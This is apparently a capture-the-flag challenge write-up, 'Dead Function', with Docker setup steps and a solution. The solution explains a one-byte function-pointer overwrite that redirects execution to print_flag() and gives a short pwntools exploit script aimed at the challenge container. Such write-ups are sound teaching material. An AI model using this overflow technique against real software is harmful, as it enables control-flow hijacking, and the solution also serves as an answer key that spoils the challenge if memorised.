# Dead Function

## Challenge

`nc pwn.tamuctf.com 4322`

## Setup
Build the container with `docker build -t pwn2 .` and run it with `docker run -it --rm pwn2`

## Solution
The solution is to overwrite the last byte of the function pointer with that of the last byte of `print_flag()`. An example solution script can be found below:  
```python
from pwn import *

p = remote('172.17.0.2', 4322)
#p = process('./pwn2')
payload = 'A'*30 + '\xd8'

p.send(payload + '\n')
p.interactive()
```
